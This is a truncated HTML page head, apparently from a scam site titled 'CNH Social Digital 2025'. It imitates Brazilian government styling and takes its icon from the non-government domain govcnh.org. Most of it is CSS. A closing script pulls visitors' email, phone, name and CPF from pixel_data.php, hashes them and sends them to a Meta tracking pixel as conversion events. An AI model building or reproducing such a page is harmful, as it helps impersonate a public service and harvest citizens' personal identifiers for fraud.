  <title>CNH Social Digital 2025</title>
     <link rel="icon" href="https://govcnh.org/cnh/img/transferir3.png" type="image/png">

  <link href="css2" rel="stylesheet">
  <style>
    :root {
      --primary-blue: #0c377a;
      --primary-dark-blue: #072453;
      --button-blue: #1351b4;
      --button-hover: #1c62d2;
      --text-color: #303030;
      --light-text: #ffffff;
      --background-color: #ffffff;
      --link-color: #1351b4;
      --link-hover: #1c62d2;
    }

    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: 'Roboto', Arial, sans-serif;
      background-color: var(--background-color);
      color: var(--text-color);
      line-height: 1.5;
    }

    .container {
      position: relative;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
    }

    .content {
      display: flex;
      flex: 1;
    }

    .left-content {
      width: 50%;
      padding: 2rem 4rem;
      display: flex;
      flex-direction: column;
      justify-content: center;
    }

    .right-content {
      width: 50%;
      overflow: hidden;
      position: relative;
      border-radius: 0 0 0 200px;
    }

    .logo-container {
      margin-bottom: 1.5rem;
    }

    .logo {
      max-width: 200px;
    }

    .title {
      color: var(--primary-blue);
      font-size: 2.5rem;
      font-weight: 700;
      margin-bottom: 0.5rem;
    }

    .subtitle {
      color: var(--primary-blue);
      font-size: 1.5rem;
      font-weight: 500;
      margin-bottom: 2rem;
    }

    .description {
      font-size: 1.2rem;
      color: var(--text-color);
      margin-bottom: 2rem;
    }

    .login-btn {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 0.5rem;
      background-color: var(--button-blue);
      color: var(--light-text);
      border: none;
      border-radius: 25px;
      padding: 1rem 2rem;
      font-size: 1rem;
      font-weight: 500;
      cursor: pointer;
      transition: background-color 0.3s ease;
      width: fit-content;
      max-width: 300px;
      text-decoration: none;
    }

    .login-btn:hover {
      background-color: var(--button-hover);
    }

    .btn-icon {
      width: 24px;
      height: 24px;
      filter: brightness(0) invert(1);
    }

    .info-link {
      margin-top: 1rem;
      margin-bottom: 2rem;
      color: var(--link-color);
      text-decoration: none;
      font-size: 1rem;
    }

    .info-link:hover {
      text-decoration: underline;
      color: var(--link-hover);
    }

    .additional-info {
      margin-top: 2rem;
      font-size: 1.1rem;
      color: var(--primary-blue);
      font-weight: 500;
    }

    .main-image {
      width: 100%;
      height: 100%;
      object-fit: cover;
      object-position: center;
    }

    .footer {
      width: 100%;
      background-color: var(--background-color);
      display: flex;
      flex-direction: column;
    }

    .footer-image {
      width: 100%;
      height: 40px;
      object-fit: cover;
    }

    .accessibility-button {
      position: fixed;
      bottom: 20px;
      right: 20px;
      background-color: var(--button-blue);
      width: 50px;
      height: 50px;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
    }

    .accessibility-icon {
      width: 24px;
      height: 24px;
      filter: brightness(0) invert(1);
    }

    @media (max-width: 1024px) {
      .left-content {
        padding: 2rem;
      }
      
      .title {
        font-size: 2rem;
      }
      
      .subtitle {
        font-size: 1.2rem;
      }
    }

    @media (max-width: 768px) {
      .content {
        flex-direction: column;
      }
      
      .left-content, 
      .right-content {
        width: 100%;
      }
      
      .left-content {
        padding: 2rem 1.5rem;
        text-align: center;
        align-items: center;
      }
      
      .right-content {
        display: none;
      }
      
      .title {
        font-size: 1.75rem;
      }
      
      .subtitle {
        font-size: 1.1rem;
        margin-bottom: 1.5rem;
      }
      
      .description {
        font-size: 1rem;
        margin-bottom: 1.5rem;
      }
      
      .login-btn {
        width: 100%;
        max-width: 280px;
      }
      
      .additional-info {
        margin-top: 3rem;
        font-size: 1rem;
      }
    }

    @media (max-width: 480px) {
      .logo {
        max-width: 150px;
      }
      
      .title {
        font-size: 1.5rem;
      }
      
      .subtitle {
        font-size: 1rem;
      }
      
      .login-btn {
        padding: 0.8rem 1.5rem;
        font-size: 0.9rem;
      }
    }
  </style>

<script>
    fetch('pixel_data.php?event=PageView&transaction_id=abc123&cpf=123123123123')
      .then(res => res.json())
      .then(data => {
        const hashUserData = u => ({
          em: u.email ? [CryptoJS.SHA256(u.email.trim().toLowerCase()).toString(CryptoJS.enc.Hex)] : [],
          ph: u.phone ? [CryptoJS.SHA256(u.phone).toString(CryptoJS.enc.Hex)] : [],
          fn: u.name ? [CryptoJS.SHA256(u.name).toString(CryptoJS.enc.Hex)] : [],
          external_id: u.cpf ? [CryptoJS.SHA256(u.cpf).toString(CryptoJS.enc.Hex)] : []
        });

        fbq('track', 'PageView', {
          event_name: 'PageView',
          event_time: Math.floor(Date.now() / 1000),
          event_id: 'PageView_' + (data.order_id || Date.now()),
          action_source: 'website',
          user_data: hashUserData(data.user || {}),
          custom_data: {
            order_id: data.order_id,
            currency: data.currency,
            value: data.value,
            content_name: data.content_name,
            content_ids: data.content_ids,
            contents: data.contents,
            num_items: data.num_items
          }
        });
      })
